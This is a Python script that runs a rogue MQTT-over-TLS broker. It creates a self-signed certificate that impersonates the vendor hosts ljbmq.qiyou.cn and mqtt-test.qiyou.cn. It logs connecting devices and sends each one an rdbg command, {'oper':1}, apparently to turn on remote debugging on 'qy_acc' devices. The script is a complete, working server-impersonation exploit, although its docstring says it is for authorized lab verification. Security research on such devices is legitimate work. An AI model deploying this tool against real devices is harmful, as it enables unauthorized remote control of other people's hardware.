#!/usr/bin/env python3
"""
Minimal lab MQTT broker for qy_acc rdbg dynamic verification.

It accepts MQTT over TLS, logs CONNECT/SUBSCRIBE packets, and when it sees a
subscription like qy_mqtt/ljb/<mac>/<sn>/#, it publishes:

    {"oper":1}

to:

    qy_mqtt/ljb/<mac>/<sn>/backend/rdbg/set

Use only in an authorized lab.
"""

from __future__ import annotations

import argparse
import os
import socket
import ssl
import struct
import subprocess
import tempfile
import threading
import time
from pathlib import Path


def read_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise EOFError("socket closed")
        buf += chunk
    return buf


def read_varint(sock: socket.socket) -> tuple[int, bytes]:
    value = 0
    multiplier = 1
    raw = b""
    for _ in range(4):
        b = read_exact(sock, 1)[0]
        raw += bytes([b])
        value += (b & 0x7F) * multiplier
        if (b & 0x80) == 0:
            return value, raw
        multiplier *= 128
    raise ValueError("bad MQTT varint")


def enc_varint(value: int) -> bytes:
    out = bytearray()
    while True:
        b = value % 128
        value //= 128
        if value:
            b |= 0x80
        out.append(b)
        if not value:
            return bytes(out)


def read_utf(buf: bytes, off: int) -> tuple[str, int]:
    if off + 2 > len(buf):
        raise ValueError("short utf len")
    n = struct.unpack_from("!H", buf, off)[0]
    off += 2
    if off + n > len(buf):
        raise ValueError("short utf body")
    return buf[off : off + n].decode("utf-8", "replace"), off + n


def enc_utf(s: str) -> bytes:
    b = s.encode()
    return struct.pack("!H", len(b)) + b


def parse_connect(body: bytes) -> tuple[int, str]:
    proto, off = read_utf(body, 0)
    if off >= len(body):
        return 4, ""
    level = body[off]
    off += 1
    off += 1  # flags
    off += 2  # keepalive
    if level == 5:
        prop_len, used = parse_varint_from_body(body, off)
        off += used + prop_len
    client_id = ""
    if off + 2 <= len(body):
        client_id, off = read_utf(body, off)
    return level, client_id or proto


def parse_varint_from_body(body: bytes, off: int) -> tuple[int, int]:
    value = 0
    multiplier = 1
    start = off
    for _ in range(4):
        if off >= len(body):
            raise ValueError("bad embedded varint")
        b = body[off]
        off += 1
        value += (b & 0x7F) * multiplier
        if (b & 0x80) == 0:
            return value, off - start
        multiplier *= 128
    raise ValueError("bad embedded varint")


def parse_subscribe(body: bytes, mqtt_level: int) -> tuple[int, list[str]]:
    if len(body) < 2:
        raise ValueError("short subscribe")
    packet_id = struct.unpack_from("!H", body, 0)[0]
    off = 2
    if mqtt_level == 5:
        prop_len, used = parse_varint_from_body(body, off)
        off += used + prop_len
    topics: list[str] = []
    while off < len(body):
        topic, off = read_utf(body, off)
        topics.append(topic)
        if off >= len(body):
            break
        off += 1  # options
    return packet_id, topics


def send_connack(sock: socket.socket, mqtt_level: int) -> None:
    if mqtt_level == 5:
        sock.sendall(b"\x20\x03\x00\x00\x00")
    else:
        sock.sendall(b"\x20\x02\x00\x00")


def send_suback(sock: socket.socket, mqtt_level: int, packet_id: int, count: int) -> None:
    if mqtt_level == 5:
        body = struct.pack("!H", packet_id) + b"\x00" + bytes([0] * count)
    else:
        body = struct.pack("!H", packet_id) + bytes([0] * count)
    sock.sendall(bytes([0x90]) + enc_varint(len(body)) + body)


def send_publish(sock: socket.socket, mqtt_level: int, topic: str, payload: bytes) -> None:
    body = enc_utf(topic)
    if mqtt_level == 5:
        body += b"\x00"  # MQTT v5 PUBLISH properties length.
    body += payload
    sock.sendall(bytes([0x30]) + enc_varint(len(body)) + body)


def parse_publish(body: bytes, mqtt_level: int, flags: int) -> tuple[str, bytes]:
    topic, off = read_utf(body, 0)
    qos = (flags >> 1) & 0x03
    if qos:
        off += 2
    if mqtt_level == 5:
        prop_len, used = parse_varint_from_body(body, off)
        off += used + prop_len
    return topic, body[off:]


def rdbg_topic_from_filter(topic_filter: str) -> str | None:
    if not topic_filter.startswith("qy_mqtt/ljb/"):
        return None
    if topic_filter.endswith("/backend/rdbg/set"):
        return topic_filter
    if not topic_filter.endswith("/#"):
        return None
    prefix = topic_filter[:-2]
    return prefix.rstrip("/") + "/backend/rdbg/set"


def handle_client(conn: socket.socket, peer: tuple[str, int], args: argparse.Namespace) -> None:
    mqtt_level = 4
    published = False
    print(f"[+] client {peer[0]}:{peer[1]} connected")
    try:
        while True:
            first = read_exact(conn, 1)[0]
            remaining, raw_len = read_varint(conn)
            body = read_exact(conn, remaining)
            packet_type = first >> 4
            flags = first & 0x0F

            if packet_type == 1:
                mqtt_level, client_id = parse_connect(body)
                print(f"[MQTT] CONNECT level={mqtt_level} client_id={client_id!r}")
                send_connack(conn, mqtt_level)
            elif packet_type == 8:
                packet_id, topics = parse_subscribe(body, mqtt_level)
                print(f"[MQTT] SUBSCRIBE id={packet_id} flags=0x{flags:x} topics={topics}")
                send_suback(conn, mqtt_level, packet_id, len(topics))
                for topic_filter in topics:
                    target = args.trigger_topic or rdbg_topic_from_filter(topic_filter)
                    if target and not published:
                        published = True
                        payload = args.payload.encode()
                        time.sleep(args.delay)
                        print(f"[!] publishing rdbg trigger topic={target!r} payload={args.payload!r}")
                        send_publish(conn, mqtt_level, target, payload)
            elif packet_type == 12:
                conn.sendall(b"\xd0\x00")
                print("[MQTT] PINGREQ -> PINGRESP")
            elif packet_type == 3:
                topic, payload = parse_publish(body, mqtt_level, flags)
                print(f"[MQTT] PUBLISH topic={topic!r} payload={payload!r}")
            elif packet_type == 14:
                print("[MQTT] DISCONNECT")
                break
            else:
                print(f"[MQTT] packet type={packet_type} flags=0x{flags:x} len={remaining}")
    except ssl.SSLError as e:
        print(f"[-] TLS error from {peer}: {e}")
    except EOFError:
        print(f"[-] client {peer[0]}:{peer[1]} closed")
    except Exception as e:
        print(f"[-] client {peer[0]}:{peer[1]} error: {e}")
    finally:
        try:
            conn.close()
        except OSError:
            pass


def ensure_self_signed_cert(cert: Path, key: Path) -> None:
    if cert.exists() and key.exists():
        return
    cert.parent.mkdir(parents=True, exist_ok=True)
    subprocess.run(
        [
            "openssl",
            "req",
            "-x509",
            "-newkey",
            "rsa:2048",
            "-nodes",
            "-sha256",
            "-days",
            "3",
            "-subj",
            "/CN=ljbmq.qiyou.cn",
            "-addext",
            "subjectAltName=DNS:ljbmq.qiyou.cn,DNS:mqtt-test.qiyou.cn",
            "-keyout",
            str(key),
            "-out",
            str(cert),
        ],
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def serve_on_port(port: int, args: argparse.Namespace, context: ssl.SSLContext | None) -> None:
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((args.bind, port))
    srv.listen(16)
    mode = "TLS" if context else "plain"
    print(f"[*] listening {mode} on {args.bind}:{port}")
    while True:
        raw, peer = srv.accept()
        try:
            conn = context.wrap_socket(raw, server_side=True) if context else raw
        except (ssl.SSLError, ConnectionResetError, OSError) as e:
            print(f"[-] TLS handshake failed from {peer}: {e}")
            raw.close()
            continue
        threading.Thread(target=handle_client, args=(conn, peer, args), daemon=True).start()


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--bind", default="0.0.0.0")
    parser.add_argument("--ports", default="8883,443", help="comma-separated ports")
    parser.add_argument("--plain", action="store_true", help="listen without TLS")
    parser.add_argument("--payload", default='{"oper":1}')
    parser.add_argument("--delay", type=float, default=1.0)
    parser.add_argument("--trigger-topic", default="", help="full topic to publish after first SUBSCRIBE")
    parser.add_argument("--cert", default="")
    parser.add_argument("--key", default="")
    args = parser.parse_args()

    context = None
    if not args.plain:
        base = Path(tempfile.gettempdir()) / "qy_mqtt_rdbg_broker"
        cert = Path(args.cert) if args.cert else base / "server.crt"
        key = Path(args.key) if args.key else base / "server.key"
        ensure_self_signed_cert(cert, key)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=cert, keyfile=key)
        print(f"[*] using cert={cert} key={key}")

    ports = [int(p.strip()) for p in args.ports.split(",") if p.strip()]
    for port in ports:
        threading.Thread(target=serve_on_port, args=(port, args, context), daemon=True).start()

    while True:
        time.sleep(3600)


if __name__ == "__main__":
    main()
